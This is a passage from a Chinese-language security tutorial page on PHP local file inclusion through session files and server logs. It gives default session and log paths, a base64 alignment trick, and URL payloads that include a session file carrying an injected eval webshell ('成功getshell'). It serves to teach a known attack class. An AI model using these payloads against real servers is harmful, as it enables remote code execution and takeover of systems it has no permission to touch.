class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">name</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>用在 cookie 或者 URL 中的会话名称， 例如：<code>PHPSESSID</code>。 只能使用字母和数字作为会话名称，建议尽可能的短一些， 并且是望文知意的名字（对于启用了 cookie 警告的用户来说，方便其判断是否要允许此 cookie）。 如果指定了 <code>name</code> 参数， 那么当前会话也会使用指定值作为名称。</p><p><strong>警告</strong></p><p>会话名称至少需要一个字母，不能全部都使用数字， 否则，每次都会生成一个新的会话 ID。</p><h5 class="anchor anchorWithStickyNavbar_mojV" id="session_start"><code>session_start（）</code><a class="hash-link" href="#session_start" title="Direct link to heading">​</a></h5><ul><li><strong>session_start()</strong> 会创建新会话或者重用现有会话。 如果通过 GET 或者 POST 方式，或者使用 cookie 提交了会话 ID， 则会重用现有会话。</li><li>当会话自动开始或者通过 <strong>session_start()</strong> 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。</li><li>通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储）， PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量。</li><li>要想使用命名会话，请在调用 <strong>session_start()</strong> 函数 之前调用 <a href="https://www.php.net/manual/zh/function.session-name.php" target="_blank" rel="noopener noreferrer">session_name()</a> 函数。</li></ul><p><strong>语法：</strong></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">session_start(array $options = array()): bool</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong>参数：</strong></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">options</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>此参数是一个关联数组，如果提供，那么会用其中的项目覆盖 <a href="https://www.php.net/manual/zh/session.configuration.php" target="_blank" rel="noopener noreferrer">会话配置指示</a> 中的配置项。此数组中的键无需包含 <code>session.</code> 前缀。</p><p>除了常规的会话配置指示项， 还可以在此数组中包含 <code>read_and_close</code> 选项。如果将此选项的值设置为 <strong><code>true</code></strong>， 那么会话文件会在读取完毕之后马上关闭， 因此，可以在会话数据没有变动的时候，避免不必要的文件锁。</p><p><strong>实例：</strong></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// page1.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">session_start();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;Welcome to page #1&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$_SESSION[&#x27;favcolor&#x27;] = &#x27;green&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$_SESSION[&#x27;animal&#x27;]   = &#x27;cat&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$_SESSION[&#x27;time&#x27;]     = time();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 如果使用 cookie 方式传送会话 ID</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;&lt;br /&gt;&lt;a href=&quot;page2.php&quot;&gt;page 2&lt;/a&gt;&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 如果不是使用 cookie 方式传送会话 ID，则使用 URL 改写的方式传送会话 ID</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;&lt;br /&gt;&lt;a href=&quot;page2.php?&#x27; . SID . &#x27;&quot;&gt;page 2&lt;/a&gt;&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">?&gt;</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ul><li><strong>请求 page1.php 页面之后， 第二个页面 page2.php 会包含会话数据。</strong></li></ul><h4 class="anchor anchorWithStickyNavbar_mojV" id="利用条件">利用条件<a class="hash-link" href="#利用条件" title="Direct link to heading">​</a></h4><ul><li><p>session文件路径已知，且其中内容部分可控</p></li><li><p><code>php的session文件的保存路径可以在phpinfo的session.save_path看到。</code></p></li><li><p>phpinfo()中第二列是<code>Local Value</code>（局部变量），第三列是<code>Master Value</code>（主变量）。其中<code>Master Value</code>是PHP.ini文件中的内容。<code>Local value</code>是当前目录中的设置，这个值会覆盖<code>Master Value</code>中对应的值。所以看的是第二列当前目录中的设置<code>D:\phpStudy\PHPTutorial\tmp\tmp</code>。</p></li></ul><p><strong>常见的php-session存放位置：</strong></p><ol><li><code>/var/lib/php/sess_PHPSESSID</code></li><li><code>/var/lib/php/sess_PHPSESSID</code></li><li><code>/tmp/sess_PHPSESSID</code></li><li><code>/tmp/sessions/sess_PHPSESSID</code></li></ol><ul><li><p>session的文件名格式为<code>sess_[phpsessid]</code>。</p></li><li><p>而phpsessid在发送的请求的cookie字段中可以看到。</p></li></ul><blockquote><p>要包含并利用的话，需要能<strong>控制部分session文件的内容</strong>。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。</p></blockquote><h4 class="anchor anchorWithStickyNavbar_mojV" id="实例">实例<a class="hash-link" href="#实例" title="Direct link to heading">​</a></h4><h5 class="anchor anchorWithStickyNavbar_mojV" id="实例1">实例1<a class="hash-link" href="#实例1" title="Direct link to heading">​</a></h5><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">session_start();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if($_SESSION[&#x27;username&#x27;]) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    header(&#x27;Location: index.php&#x27;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    exit;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 第8行</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if($_POST[&#x27;username&#x27;] &amp;&amp; $_POST[&#x27;password&#x27;]) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $username = $_POST[&#x27;username&#x27;];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 第20行</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $stmt-&gt;bind_result($res_password);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 第24行</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if ($res_password == $password) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $_SESSION[&#x27;username&#x27;] = base64_encode($username);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        header(&quot;location:index.php&quot;);</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol><li>PHP 会将会话中的数据设置到 <code>$_SESSION</code> 变量中。</li><li>当 PHP 停止的时候，它会自动读取 <code>$_SESSION</code> 中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存。</li><li>对于文件会话保存管理器，会将会话数据保存到配置项 <code>session.save_path</code> 所指定的位置。</li></ol><blockquote><p>考虑到变量<code>$username</code>是我们可控的，并且被设置到了<code>$_SESSION</code>中，因此我们输入的数据未经过滤的就被写入到了对应的sessioin文件中。结合前面的php文件包含，可以推测这里可以包含session文件。</p></blockquote><blockquote><p>要包含session文件，需要知道文件的路径。先注册一个用户，比如Johnson。等登陆成功后，记录下cookie中的PHPSESSID的值，这里为0d0385dc6a1067f4e3406191（经过测试不注册也行，输入一个不存在的用户名，登录失败也会生成session文件，名称都为<code>sess_cookie值</code>）</p></blockquote><p><strong>访问：</strong></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">http://x.x.x.x/index.php?file=file:///var/lib/php5/sess_0d0385dc6a1067f4e3406191</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>其中<code>/var/lib/php5/</code>的session文件路径是测试出来的，常见的php-session存放位置在上面也有列出来了。</p><p>这里能包含，并且控制session文件，但要写入可用的payload，还需要绕过：</p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">$_SESSION[&#x27;username&#x27;] = base64_encode($username);</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">未编码: abc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">转成ascii码： 97 98 99</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">转成对应二进制（三组，每组8位）： 01100001 01100010 01100011</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">重分组（四组，每组6位）： 011000 010110 001001 100011</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">每组高位补零，变为每组8位：00011000 00010110 00001001 00100011</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">每组对应转为十进制： 24 22 9 35</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">查Base64编码表得： Y W J j</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><blockquote><p>考虑一下session的前缀：<code>username|s:12:&quot;</code>，中间的数字12表示后面base64串的长度。当base64串的长度小于100时，前缀的长度固定为15个字符，当base64串的长度大于100小于1000时，前缀的长度固定为16个字符。</p></blockquote><p>由于16个字符，恰好满足以下条件：</p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">16个字符 =&gt; 16 * 6 = 96 位 =&gt; 96 mod 8 = 0</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>也就是说，当对session文件进行base64解密时，前16个字符固然被解密为乱码，但不会再影响从第17个字符后的部分也就是base64加密后的username。</p><p>那么这里注册一个账号</p><p><code>JohnsonJohnsonJohnsonJohnsonJohnsonJohnsonJohnsonJohnsonJohnson</code></p><p><code>&lt;?php eval($_GET[&#x27;abcdefg&#x27;]) ?&gt;</code>,其base64加密后的长度为128，大于100。（经过测试不注册也行，输入一个不存在的用户名，登录失败也会生成session文件，名称都为<code>sess_cookie值</code>）</p><p><strong>访问：</strong></p><p><code>http://x.x.x.x/index.php?file=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_0d0385dc6a1067f4e3406191&amp;abcdefg=phpinfo();</code></p><p><strong>成功getshell</strong></p><h5 class="anchor anchorWithStickyNavbar_mojV" id="实例2">实例2<a class="hash-link" href="#实例2" title="Direct link to heading">​</a></h5><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">现在有一个session.php可控用户会话信息值：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    session_start();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $username = $_POST[&#x27;username&#x27;];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $_SESSION[&#x27;username&#x27;] = $username;</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ul><li><p>可以看到这个session.php文件中的用户会话信息username的值是用户可控制的，那我们就可以传入恶意代码进行攻击利用。</p></li><li><p>如果这里有注册功能，那么我们先注册一个用户<code>&lt;?php phpinfo();?&gt;</code>。然后用其登录：<code>username=&lt;?php phpinfo();?&gt;</code>。</p></li><li><p>等登陆成功后，记录下cookie中的PHPSESSID的值，这里为<code>r7csmqpu1lul3elgsb6o9g6u1b</code>。（经过测试不注册也行，输入一个不存在的用户名，登录失败也会生成session文件，那么直接不注册输入<code>&lt;?php phpinfo();?&gt;</code>登录也能生成，名称都为<code>sess_cookie值</code>）</p></li><li><p>将恶意代码传入以后，接下来就要利用文件包含漏洞去包含这个恶意代码。</p></li></ul><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">fileinclude.php?file=D:\phpStudy\PHPTutorial\tmp\tmp\sess_r7csmqpu1lul3elgsb6o9g6u1b</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_mojV" id="包含日志">包含日志<a class="hash-link" href="#包含日志" title="Direct link to heading">​</a></h3><h4 class="anchor anchorWithStickyNavbar_mojV" id="利用条件-1">利用条件：<a class="hash-link" href="#利用条件-1" title="Direct link to heading">​</a></h4><ul><li>需要知道服务器日志的存储路径，且日志文件可读。</li></ul><blockquote><p>很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入<code>access.log</code>，当发生错误时将错误写入<code>error.log</code>。默认情况下，日志保存路径在 <code>/var/log/apache2/</code>。</p></blockquote><p>日志存储默认路径：</p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">1.apache+Linux日志默认路径：/etc/httpd/logs/access.log或/var/log/httpd/access.log</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2.apache+win2003日志默认路径：D:\xampp\apache\logs\access.log、D:\xampp\apache\logs\error.log</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3.IIS6.0+win2003默认日志文件：C:\WINDOWS\system32\Logfiles</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4.IIS7.0+win2003 默认日志文件：%SystemDrive%\inetpub\logs\LogFiles</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">5.nginx 日志文件：日志文件在用户安装目录logs目录下,假设安装路径为/usr/local/nginx,那日志目录就是在/usr/local/nginx/logs下面</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改。比如下面的<code>&lt;?php phpinfo();?&gt;</code>修改为<code>%3C?php%20phpinfo();%20?%3E</code></p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages navigation"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs-web/常见漏洞类型/sql注入"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">sql注入</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs-web/语言与框架/Java/基础知识/JVM"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">JVM</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_cNA8 thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#漏洞原理" class="table-of-contents__link toc-highlight">漏洞原理</a></li><li><a href="#危险函数" class="table-of-contents__link toc-highlight">危险函数</a><ul><li><a href="#php" class="table-of-contents__link toc-highlight">php</a></li><li><a href="#jspservlet" class="table-of-contents__link toc-highlight">jsp/Servlet</a></li><li><a href="#asp" class="table-of-contents__link toc-highlight">asp</a></li></ul></li><li><a href="#php文件包含" class="table-of-contents__link toc-highlight">PHP文件包含</a><ul><li><a href="#lfilocal-file-inclusion漏洞" class="table-of-contents__link toc-highlight"><strong>LFI(Local File Inclusion)漏洞</strong></a></li><li><a href="#rfiremote-file-inclusion漏洞" class="table-of-contents__link toc-highlight"><strong>RFI(Remote File Inclusion)漏洞</strong></a></li><li><a href="#搜寻敏感文件的绝对路径" class="table-of-contents__link toc-highlight">搜寻敏感文件的绝对路径</a></li><li><a href="#表单编码方式enctype" class="table-of-contents__link toc-highlight">表单编码方式enctype</a></li><li><a href="#php特殊字符" class="table-of-contents__link toc-highlight">php特殊字符</a></li><li><a href="#php伪协议" class="table-of-contents__link toc-highlight">php伪协议</a></li><li><a href="#包含session" class="table-of-contents__link toc-highlight">包含session</a></li><li><a href="#包含日志" class="table-of-contents__link toc-highlight">包含日志</a></li></ul></li></ul></div></div></div></div></main></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">感谢</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://docusaurus.io/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Docusaurus<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://github.com/urdr-gungnir" target="_blank" rel="noopener noreferrer" class="footer__link-item">Gungnir@TnT-Security-Lab<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="col footer__col"><div class="footer__title">更多</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/blog">了解我们</a></li><li class="footer__item"><a href="https://github.com/TnT-Security-Lab" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        <span id="busuanzi_container_site_pv">本站总访问量:<span id="busuanzi_value_site_pv"></span>次</span><br>
        Copyright © 2022 Gungnir@TnT-Security-Lab.</div></div></div></footer></div>
<script src="/assets/js/runtime~main.3c62fd08.js"></script>
<script src="/assets/js/main.6dd2dae4.js"></script>
</body>
</html>